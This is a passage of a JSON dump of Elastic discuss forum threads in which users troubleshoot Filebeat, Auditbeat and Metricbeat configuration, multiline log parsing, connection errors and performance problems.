add_docker_metadata: ~ - add_host_metadata: ~ output.file: path: \"/tmp/filebeat\" filename: filebeat There is something that I'm missing or missunderstanding? Thanks for your help!",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "8ee9a8b6-8d3b-444b-9aee-8acc0acd8ca6",
    "url": "https://discuss.elastic.co/t/filebeat-7-6-kubernetes-openshift-missing-labels/227912",
    "title": "Filebeat 7.6 Kubernetes [ Openshift ] - Missing labels",
    "category": [
      "Beats"
    ],
    "author": "Zerobot",
    "date": "April 14, 2020, 12:55pm April 14, 2020, 1:11pm April 15, 2020, 6:35am",
    "body": "Hi! We're trying to run Filebeat on Openshift. We want to create indices based on project-labels. Let's say we have a project label called \"system-name\". Multiple projects could have the same \"system-name\" because they are a part of the same system and We don't want to have separate indices for every single project. Reading trough docs I understood that Filebeat kubernetes providers should get these labels in \"data.kubernetes.labels\" Reading trough docs https://www.elastic.co/guide/en/beats/filebeat/current/configuration-autodiscover.html { \"host\": \"172.17.0.21\", \"port\": 9090, \"kubernetes\": { \"container\": { \"id\": \"bb3a50625c01b16a88aa224779c39262a9ad14264c3034669a50cd9a90af1527\", \"image\": \"prom/prometheus\", \"name\": \"prometheus\" }, \"labels\": { \"project\": \"prometheus\", ... }, \"namespace\": \"default\", \"node\": { \"name\": \"minikube\" }, \"pod\": { \"name\": \"prometheus-2657348378-k1pnh\" } }, } Sadly, after sending whole \"data.kubernetes\" JSON field, it seems We even got \"data.kubernetes.pod.labels\" but not \"data.kubernetes.labels\". Is that a known error on Openshift? Also, we are using Hints based autodiscover, config looks like this: filebeat.autodiscover: providers: - type: kubernetes node: ${NODE_NAME} hints.enabled: true hints.default_config: type: container paths: - /var/log/containers/*${data.kubernetes.container.id}.log processors: - drop_event: when: equals: kubernetes.namespace: kube-system - add_labels: labels: osh_cluster: test namespace_all: '${data.kubernetes}' # sadly, no \"data.kubernetes.labels\" are received by Elasticsearch filebeat.modules: - module: haproxy log: enabled: true var.paths: [\"/var/log/haproxy.log\"] var.input: \"file\" processors: - add_cloud_metadata: - add_host_metadata: cloud.id: ${ELASTIC_CLOUD_ID} cloud.auth: ${ELASTIC_CLOUD_AUTH} output.logstash: hosts: [\"#\"] loadbalance: true",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "c34b3d0e-10e2-45c5-bb8d-2089d727f9e3",
    "url": "https://discuss.elastic.co/t/aix-and-solaris-beat-agent/228035",
    "title": "AIX and Solaris Beat Agent",
    "category": [
      "Beats",
      "Community Beats"
    ],
    "author": "darkwingzero",
    "date": "April 15, 2020, 5:47am April 15, 2020, 6:16am",
    "body": "Hi Elastic Partners, What are the option to crawl and ship logs from AIX and solaris Os to logstash? Thank you!",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "10ccce1c-03fb-4b09-a695-bf12182f8309",
    "url": "https://discuss.elastic.co/t/multiline-java-stack-trace-parsing-doesnt-work/227783",
    "title": "Multiline Java Stack Trace parsing doesn't work",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "ramokarahasan",
    "date": "April 13, 2020, 2:41pm April 14, 2020, 9:34am April 15, 2020, 6:08am April 14, 2020, 10:04am April 15, 2020, 6:08am",
    "body": "I'm reviewing and trying: https://www.elastic.co/guide/en/beats/filebeat/current/multiline-examples.html and also followed: Filebeat Multiline Java Stack Trace I've deployed the latest ELK stack and running logfiles -> filebeat -> logstash -> ES -> Kibana I'm receiving Spring Boot 2.x logs in this format and store them into logfiles. 2020-04-13 14:13:08.895 ERROR 1 --- [ elastic-1228] s.ConnectorConfigServiceExceptionHandler : Exception handled com.itembase.iws.connector.config.ConnectorConfigNotFoundException: Requested configuration was not found at com.itembase.iws.connector.config.webservice.connection.ConnectionEntityService.getByInstanceIdAndUniqueIdentifier(ConnectionEntityService.java:146) ~[classes/:na] Suppressed: reactor.core.publisher.FluxOnAssembly$OnAssemblyException: Error has been observed at the following site(s): |_ checkpoint â¢ Handler com.itembase.iws.connector.config.webservice.connection.ConnectionRestController#getByInstanceAndUniqueIdentifier(UUID, String) [DispatcherHandler] Stack trace: at com.itembase.iws.connector.config.webservice.connection.ConnectionEntityService.getByInstanceIdAndUniqueIdentifier(ConnectionEntityService.java:146) ~[classes/:na] at com.itembase.iws.connector.config.webservice.connection.ConnectionRestController.getByInstanceAndUniqueIdentifier(ConnectionRestController.java:66) ~[classes/:na] at jdk.internal.reflect.GeneratedMethodAccessor204.invoke(Unknown Source) ~[na:na] at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:na] at java.base/java.lang.reflect.Method.invoke(Method.java:566) ~[na:na] at org.springframework.web.reactive.result.method.InvocableHandlerMethod.lambda$invoke$0(InvocableHandlerMethod.java:147) ~[spring-webflux-5.2.4.RELEASE.jar:5.2.4.RELEASE] at reactor.core.publisher.MonoFlatMap$FlatMapMain.onNext(MonoFlatMap.java:118) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.Operators$MonoSubscriber.complete(Operators.java:1705) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.MonoZip$ZipCoordinator.signal(MonoZip.java:247) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.MonoZip$ZipInner.onNext(MonoZip.java:329) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.MonoPeekTerminal$MonoTerminalPeekSubscriber.onNext(MonoPeekTerminal.java:173) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.FluxDefaultIfEmpty$DefaultIfEmptySubscriber.onNext(FluxDefaultIfEmpty.java:92) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.FluxSwitchIfEmpty$SwitchIfEmptySubscriber.onNext(FluxSwitchIfEmpty.java:67) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.Operators$ScalarSubscription.request(Operators.java:2267) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.Operators$MultiSubscriptionSubscriber.set(Operators.java:2075) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.Operators$MultiSubscriptionSubscriber.onSubscribe(Operators.java:1949) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.FluxFlatMap.trySubscribeScalarMap(FluxFlatMap.java:191) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.MonoFlatMap.subscribeOrReturn(MonoFlatMap.java:53) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.Mono.subscribe(Mono.java:4095) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.MonoZip.subscribe(MonoZip.java:128) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.InternalMonoOperator.subscribe(InternalMonoOperator.java:55) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.MonoDefer.subscribe(MonoDefer.java:52) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.MonoIgnoreThen$ThenIgnoreMain.drain(MonoIgnoreThen.java:153) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.MonoIgnoreThen.subscribe(MonoIgnoreThen.java:56) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.InternalMonoOperator.subscribe(InternalMonoOperator.java:55) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.MonoFlatMap$FlatMapMain.onNext(MonoFlatMap.java:150) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.FluxSwitchIfEmpty$SwitchIfEmptySubscriber.onNext(FluxSwitchIfEmpty.java:67) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.MonoNext$NextSubscriber.onNext(MonoNext.java:76) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.FluxConcatMap$ConcatMapImmediate.innerNext(FluxConcatMap.java:274) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.FluxConcatMap$ConcatMapInner.onNext(FluxConcatMap.java:851) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.FluxMapFuseable$MapFuseableSubscriber.onNext(FluxMapFuseable.java:121) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.MonoPeekTerminal$MonoTerminalPeekSubscriber.onNext(MonoPeekTerminal.java:173) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.Operators$ScalarSubscription.request(Operators.java:2267) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.MonoPeekTerminal$MonoTerminalPeekSubscriber.request(MonoPeekTerminal.java:132) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.FluxMapFuseable$MapFuseableSubscriber.request(FluxMapFuseable.java:162) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.Operators$MultiSubscriptionSubscriber.set(Operators.java:2075) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.Operators$MultiSubscriptionSubscriber.onSubscribe(Operators.java:1949) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.FluxMapFuseable$MapFuseableSubscriber.onSubscribe(FluxMapFuseable.java:90) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.MonoPeekTerminal$MonoTerminalPeekSubscriber.onSubscribe(MonoPeekTerminal.java:145) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.MonoJust.subscribe(MonoJust.java:54) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.Mono.subscribe(Mono.java:4110) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.FluxConcatMap$ConcatMapImmediate.drain(FluxConcatMap.java:441) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.FluxConcatMap$ConcatMapImmediate.onSubscribe(FluxConcatMap.java:211) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.FluxIterable.subscribe(FluxIterable.java:161) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.FluxIterable.subscribe(FluxIterable.java:86) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.InternalMonoOperator.subscribe(InternalMonoOperator.java:55) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.MonoDefer.subscribe(MonoDefer.java:52) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.InternalMonoOperator.subscribe(InternalMonoOperator.java:55) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.MonoDefer.subscribe(MonoDefer.java:52) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.InternalMonoOperator.subscribe(InternalMonoOperator.java:55) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.MonoDefer.subscribe(MonoDefer.java:52) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.Mono.subscribe(Mono.java:4110) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.MonoIgnoreThen$ThenIgnoreMain.drain(MonoIgnoreThen.java:172) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.MonoIgnoreThen.subscribe(MonoIgnoreThen.java:56) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.core.publisher.InternalMonoOperator.subscribe(InternalMonoOperator.java:55) ~[reactor-core-3.3.3.RELEASE.jar:3.3.3.RELEASE] at reactor.netty.http.server.HttpServerHandle.onStateChange(HttpServerHandle.java:64) ~[reactor-netty-0.9.5.RELEASE.jar:0.9.5.RELEASE] at reactor.netty.tcp.TcpServerBind$ChildObserver.onStateChange(TcpServerBind.java:228) ~[reactor-netty-0.9.5.RELEASE.jar:0.9.5.RELEASE] at reactor.netty.http.server.HttpServerOperations.onInboundNext(HttpServerOperations.java:465) ~[reactor-netty-0.9.5.RELEASE.jar:0.9.5.RELEASE] at reactor.netty.channel.ChannelOperationsHandler.channelRead(ChannelOperationsHandler.java:90) ~[reactor-netty-0.9.5.RELEASE.jar:0.9.5.RELEASE] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:377) ~[netty-transport-4.1.45.Final.jar:4.1.45.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:363) ~[netty-transport-4.1.45.Final.jar:4.1.45.Final] at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:355) ~[netty-transport-4.1.45.Final.jar:4.1.45.Final] at reactor.netty.http.server.HttpTrafficHandler.channelRead(HttpTrafficHandler.java:170) ~[reactor-netty-0.9.5.RELEASE.jar:0.9.5.RELEASE] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:377) ~[netty-transport-4.1.45.Final.jar:4.1.45.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:363) ~[netty-transport-4.1.45.Final.jar:4.1.45.Final] at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:355) ~[netty-transport-4.1.45.Final.jar:4.1.45.Final] at io.netty.channel.CombinedChannelDuplexHandler$DelegatingChannelHandlerContext.fireChannelRead(CombinedChannelDuplexHandler.java:436) ~[netty-transport-4.1.45.Final.jar:4.1.45.Final] at io.netty.handler.codec.ByteToMessageDecoder.fireChannelRead(ByteToMessageDecoder.java:321) ~[netty-codec-4.1.45.Final.jar:4.1.45.Final] at io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:295) ~[netty-codec-4.1.45.Final.jar:4.1.45.Final] at io.netty.channel.CombinedChannelDuplexHandler.channelRead(CombinedChannelDuplexHandler.java:251) ~[netty-transport-4.1.45.Final.jar:4.1.45.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:377) ~[netty-transport-4.1.45.Final.jar:4.1.45.Final] 2020-04-13 14:13:08.895 ERROR 1 --- [ elastic-1228] s.ConnectorConfigServiceExceptionHandler : Reported error: status=404, error=Not Found, errorId=b770d910-c8e5-446a-80b7-f88453b34a62, message=Requested configuration was not found this is my filebeat.yml file filebeat: # List of inputs. inputs: [{\"paths\": [\"/srv/iws/logs/*/*.log\"], \"type\": \"log\"}] processors: - drop_fields: fields: [\"host\"] #multiline.pattern: '^\\[0-9]{4}-[0-9]{2}-[0-9]{2}' #multiline.negate: false #multiline.match: after multiline.pattern: '^([0-9]{4}-[0-9]{2}-[0-9]{2})' multiline.negate: true multiline.match: after multiline.timeout: 120s #default 5s multiline.max_lines: 10000 #default 500 # Configure what outputs to use when sending the data collected by the beat. # Multiple outputs may be used. output: ### Logstash as output logstash: # The Logstash hosts hosts: [\"10.0.106.36:5044\"] # Number of workers per Logstash host. #worker: 1 # Optional load balance the events between the Logstash hosts #loadbalance: true # Optional index name. The default index name depends on the each beat. # For Packetbeat, the default is set to packetbeat, for Topbeat # top topbeat and for Filebeat to filebeat. #index: filebeat logging.level: debug logging.to_files: true logging.files: path: /var/log/filebeat name: debug.log keepfiles: 3 with the applied multiline filter I still see a lot of events created in the debug logs where a log of \"messages\" are created starting with \"at\" for the specified log posted above. I'd exped to get the full stacktrace in a single event. I'd be happy to receive any hint on how that could work out.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "a54ffdd9-0483-40c3-8f45-eff4db51a9ab",
    "url": "https://discuss.elastic.co/t/file-is-inactive-closing-because-close-inactive-of-15m0s-reached/227885",
    "title": "File is inactive: Closing because close_inactive of 15m0s reached",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "nikhilesh",
    "date": "April 14, 2020, 10:15am April 14, 2020, 2:21pm April 15, 2020, 2:46am",
    "body": "Hi Team, frequently fIlebeat is stopped suddenly and can see below error in logs. please help on this. File is inactive: Closing because close_inactive of 5m0s reached 2020-04-14T02:56:12.960-0500 INFO log/harvester.go:320 Reader was closed: /path/access.log. Closing. 2020-04-14T02:56:12.960-0500 INFO log/harvester.go:320 Reader was closed: NOTE: we have a log file rotation Thanks Nikhilesh Gade",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "e834ca63-9140-4ec2-be4a-5ffdfb7347ca",
    "url": "https://discuss.elastic.co/t/error-monitoring-windows-folders-recursively/228008",
    "title": "Error monitoring Windows folders recursively",
    "category": [
      "Beats",
      "Auditbeat"
    ],
    "author": "FatalGlitch",
    "date": "April 14, 2020, 11:22pm April 14, 2020, 11:25pm",
    "body": "Auditbeat 6.8.7 I'm trying to use the FIM module to monitor C:\\Windows in recursive, and when I do this, I just get an error as below: WARN [file_integrity] file_integrity/eventreader_fsnotify.go:150 fsnotify watcher error {\"error\": \"short read in readEvents()\"} This just repeats over and over until I stop the agent. Can someone assist with what this means and how to fix?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "50916f24-f97a-40d7-873d-5102383089b6",
    "url": "https://discuss.elastic.co/t/save-field-parameter-is-not-valid/227849",
    "title": "Save field parameter is not valid",
    "category": [
      "Beats"
    ],
    "author": "vijay_kaali",
    "date": "April 14, 2020, 10:31pm",
    "body": "I am using elk 6.3 i have downloaded dashboard to test environment and i get save field parameter is not valid throws . I checked the individual visualization and actual field name is not listed. issue is in index patterns all fields have duplicates with suffix keyword for eg it has beat.name => string , searchable beat.name.keywork => string , searchable, aggregatable due to this existing visualization are invalid as aggregate field beat.name in dashboard is not valid now and only you can use beat.name.keyword in aggregation . How can i resolve this ? recreated index patterns still have same issue",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "611d9178-e161-4c38-99b6-399863269a82",
    "url": "https://discuss.elastic.co/t/date-and-time-incorrect-with-filebeat/227987",
    "title": "Date and time incorrect with filebeat",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "andywt123",
    "date": "April 14, 2020, 7:24pm",
    "body": "I am running a brand new install of elasticsearch. I have noticed that some of the systems have the date and time reported incorrectly for some not all log entries. I ran timedatectl on the Rhel instance and it is correct. I am using filebeat 7.6 to elastic search. The only module enabled is system.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "6e3b754c-5925-4946-96da-bc5219c5d853",
    "url": "https://discuss.elastic.co/t/aws-elasticsearch-service-metricbeats/227028",
    "title": "AWS ElasticSearch Service MetricBeats",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "vennemp",
    "date": "April 7, 2020, 11:52pm April 9, 2020, 5:16pm April 9, 2020, 5:31pm April 10, 2020, 10:03am April 14, 2020, 3:52pm April 14, 2020, 4:40pm April 14, 2020, 4:44pm",
    "body": "I am trying to set up MetricBeats with AWS hosted ElasticSearch service. However, in the metricbeats.yml file it asks for a user name and password.. and there isn't a user name and password in AWS ElasticSearch/Kibana for sending data. I have it configured to accept data from every where unauthenticated. Metricbeats is running on my logstash server which is sending data to the same ES cluster with no issues. This is my error message. Please advise. Couldn't connect to any of the configured Elasticsearch hosts. Errors: [Error connection to Elasticsearch https://vpc-chzd52f2bk2ay7y5p2fu.us-east-1.es.amazonaws.com:443: Connection marked as failed because the onConnect callback failed: cannot retrieve the elasticsearch license: unauthorized access, could not connect to the xpack endpoint, verify your credentials]",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "e90dd108-4665-492d-bd32-e9416e12b968",
    "url": "https://discuss.elastic.co/t/missing-files-after-filebeat-compile/227855",
    "title": "Missing files after filebeat compile",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "craigothy",
    "date": "April 14, 2020, 6:11am April 14, 2020, 9:04am April 14, 2020, 12:50pm",
    "body": "When I clone the v7.6.2 tagged branch: git clone --single-branch --branch v7.6.2 https://github.com/elastic/beats ${GOPATH}/src/github.com/elastic/beats And do a mage package in the x-pack/filebeat directory, everything builds just fine but when I install the .deb package, I see that the /etc/filebeat directory is empty and none of the /etc/filebeat/modules.d files are present. Any ideas what the problem might be? Thank you.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "ace2e5bd-c97b-4b51-a8e9-953e52c1c757",
    "url": "https://discuss.elastic.co/t/error-pipeline-output-go-100-failed-to-connect-to-backoff-elasticsearch-https-es-url-401-unauthorized/227772",
    "title": "ERROR pipeline/output.go:100 Failed to connect to backoff(elasticsearch(https://<ES_URL>)): 401 Unauthorized",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "_kyllr",
    "date": "April 13, 2020, 3:20pm April 14, 2020, 1:02am April 14, 2020, 6:20am April 14, 2020, 7:15am April 14, 2020, 10:30am",
    "body": "Hello, AWS Elasticsearch Version: 7.1 aws-es-proxy-0.9-windows-amd64.exe Kibana OSS 7.1.1 Filebeat OSS 7.1.1 This is a production issue on our windows server, we suddenly got this error from filebeat logs: 2020-04-13T06:41:59.305-0400 ERROR pipeline/output.go:100 Failed to connect to backoff(elasticsearch(https://<ES_URL>)): 401 Unauthorized: This causing our Elasticsearch not collecting logs. config/kibana.yml server.port: 5609 server.host: \"\" server.basePath: \"/7.1/kibana\" elasticsearch.url: \"http://127.0.0.1:9230/\" elasticsearch.ssl.verificationMode: none config/filebeat.yml username: \"\" password: \"\" setup.ilm.enabled: false Other filebeat config wasn't mention here. Could someone please help me find out and understand the reason of the issue.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "2eef90ab-1fdd-4fa8-a424-8f1b3ad12630",
    "url": "https://discuss.elastic.co/t/filebeat-6-8-6-get-kernel-version-of-os/227823",
    "title": "Filebeat 6.8.6 - Get kernel version of OS",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "michael_sc",
    "date": "April 13, 2020, 8:39pm April 14, 2020, 9:13am",
    "body": "I want to add the kernel version of the host to the filebeat output. Can I do that with this version, and if so, where in the config file do I need to add parameters.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "622d7b7c-a115-48f7-8ba6-c60ec5be3313",
    "url": "https://discuss.elastic.co/t/to-read-particular-event-form-text-file/227861",
    "title": "To Read particular event form text file",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "aman97",
    "date": "April 14, 2020, 7:25am April 14, 2020, 7:27am April 14, 2020, 9:10am",
    "body": "Hi, I am having a multiline text file with multiple events, I want to read a particular event from a file. First, I want to know how can I read this particular multiline text file in filebeat then after how can i extract particular event from file",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "3bc69804-e5e9-442f-b57b-c7a330f8ec5b",
    "url": "https://discuss.elastic.co/t/auditbeat-memory-leak-in-7-5-2/218335",
    "title": "[Auditbeat] Memory leak in 7.5.2",
    "category": [
      "Beats"
    ],
    "author": "nickbabkin",
    "date": "February 7, 2020, 11:46am February 7, 2020, 11:44am February 7, 2020, 3:04pm February 10, 2020, 10:34am February 11, 2020, 10:01am February 12, 2020, 8:38am February 18, 2020, 9:38am February 18, 2020, 9:58am February 18, 2020, 10:08am February 18, 2020, 2:02pm February 18, 2020, 4:16pm February 18, 2020, 4:30pm February 20, 2020, 10:28am February 25, 2020, 10:24am February 27, 2020, 10:00am February 27, 2020, 10:21am March 26, 2020, 12:21pm April 6, 2020, 4:51pm April 6, 2020, 4:52pm April 14, 2020, 8:33am",
    "body": "Hi! It seems like there's a memory leak in latest version of auditbeat (7.5.2) that is running with socket module enabled on high network loaded servers (such as load balancers). We recently upgraded to the newest version (7.5.2) from 6.8.0 (which had no similar issues) and started to experience intense memory loads. Not only memory usage was above what we think is normal (around 300-400 MB for a beat), it continued to grow up indefinitely until it went OOM and even crashed some of our servers. This only applies to our load balancers, memory usage on other type of servers seems to stay within the reasonable limits, although it might be due to the fact that there are not many active sockets. Some technical information: Affected version of auditbeat: 7.5.2 Aftected servers operating system: Ubuntu 16.04.5 LTS Auditbeat config: auditbeat.modules: - module: auditd # Load audit rules from separate files. Same format as audit.rules(7). audit_rule_files: [ '${path.config}/audit.rules.d/*.conf' ] - module: file_integrity paths: - /bin - /usr/bin - /sbin - /usr/sbin - /etc - /root/.ssh/authorized_keys - module: system datasets: - host # General host information, e.g. uptime, IPs - login # User logins, logouts, and system boots. - package # Installed, updated, and removed packages - process # Started and stopped processes - socket # Opened and closed sockets - user # User information # How often datasets send state updates with the # current state of the system (e.g. all currently # running processes, all open sockets). state.period: 1h # How often auditbeat queries for new processes, sockets etc metrics.period: 3s # Enabled by default. Auditbeat will read password fields in # /etc/passwd and /etc/shadow and store a hash locally to # detect any changes. user.detect_password_changes: true # File patterns of the login record files. login.wtmp_file_pattern: /var/log/wtmp* login.btmp_file_pattern: /var/log/btmp* output.logstash: hosts: *** ssl.certificate_authorities: *** bulk_max_size: 2096 timeout: 15 setup.template.name: \"logstash_auditbeat_template\" setup.template.pattern: \"logstash-auditbeat-*\" setup.template.settings: index.number_of_shards: 3 index.refresh_interval: 30s processors: - add_host_metadata: netinfo.enabled: true cache.ttl: 5m We have the same configuration on all servers where auditbeat is deployed. Also attaching screenshots with memory usage on load balancer and other example server over last couple days (sudden drop of memory usage on load balancer was due to restarting auditbeat daemon). As you can see, it looks pretty okay on the server that doesn't have a load balancer role. Auditbeat Memory Usage - load balancer1314×552 63.6 KB Auditheat memory usage - other server1298×544 57.5 KB",
    "website_area": "discuss",
    "replies": 20
  },
  {
    "id": "6a87512b-1172-4c07-85c8-485285ea3dfd",
    "url": "https://discuss.elastic.co/t/metricbeat-connectivity-issue-to-elasticsearch/227114",
    "title": "Metricbeat connectivity issue to Elasticsearch",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "DeepakBishi",
    "date": "April 8, 2020, 11:42am April 14, 2020, 7:24am",
    "body": "I am facing an issue of metricbeat not able to connect to elaticsearch. I have installed metricbeat in a remote host and trying to send the data to elasticsearch which is hosted on another host. While starting metricbeat, it is giving an error. image1899×126 18.2 KB And secondly, if i am sending the data to logstash it is getting connected, but i have no idea how to capture the data in logstash and create an index for that? Please guide me. Thanks in Advance",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "217d9285-486e-4754-8991-5d5dc90eb6c1",
    "url": "https://discuss.elastic.co/t/unexpected-state-reading-from-file-stale-nfs-handle-errors/227853",
    "title": "Unexpected state reading from file - stale NFS handle errors",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "msunilreddy",
    "date": "April 14, 2020, 5:39am April 14, 2020, 5:40am April 14, 2020, 5:55am April 14, 2020, 6:02am",
    "body": "Hi Team, We have deployed filebeat as docker container for reading log files by volume mounting of logs files from NFS server. We are getting stale NFS handle errors. Could you please help us how to resolve this issue. Is filebeat capable of reading NFS log files using volume mounting in docker containers ? We are using filebeat 7.4.0 version. ERROR log/log.go:110 Unexpected state reading from /hostfs/opt/caemm/sample.log; error: read /hostfs/opt/caemm/sample.log: stale NFS file handle Thanks, Sunil",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "f508501b-5658-4431-847b-d4a3a35c3809",
    "url": "https://discuss.elastic.co/t/filebeat-performing-better-when-reading-multiple-files-rather-the-a-single-file/226800",
    "title": "Filebeat performing better when reading multiple files rather the a single file",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "bink",
    "date": "April 7, 2020, 12:24am April 13, 2020, 4:16pm April 14, 2020, 3:50am",
    "body": "We have a cluster configured with 5 logstash servers and 30 ES servers. A single host is exporting logs from a single file across the 5 logstash servers in a load balanced configuration using the filebeat logstash output. (load_balance: true, worker: 2) When this was originally configured using ELK 6.2 we were seeing an ingest rate of about 96k events per second max. In recent weeks the volume of logs started to go up and our stack started to fall behind. We upgraded filebeat, logstash, es, and kibana to the latest 6.x version and noticed a drop in ingest rates to around 60k/second. Now the odd thing is, because our stack can't keep up we've started seeing log rotation come into play. The filebeat service will fall far enough behind that it will often be reading from the current log file as well as 1 or 2 rotated log files before they are compressed and archived. While reading from the one file we get the aforementioned 60k/sec ingest rate, but when the logs are rotated and filebeat is reading from 2 or more files at a time the ingest rate jumps up to 80k+/sec. All of the files are located on the same physical partition (AWS NVME) so I don't think it's an iOPS limit we're hitting. I've tried playing with various settings including: queue.mem.events queue.mem.flush.min_events queue.mem.flush.timeout bulk_max_size pipelining compression worker But none of these seem to improve at all upon the 60k/sec ingest rate. Now we know the stack itself can handle a higher rate, as it floats along just fine when multiple files are being read. Due to this problem we're looking at moving away from filebeat to a direct syslog->logstash flow. But in the meantime I'd really like to figure out a way to match the performance we see when reading from multiple files vs. one file. Any thoughts on why we'd see a 30% gain in performance when reading from more than one file?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "9dd423c9-e25a-4c27-b666-c2415d41bb32",
    "url": "https://discuss.elastic.co/t/config-for-monitoring-windows-services-by-heartbeat-error/226999",
    "title": "Config for Monitoring Windows Services by heartbeat error",
    "category": [
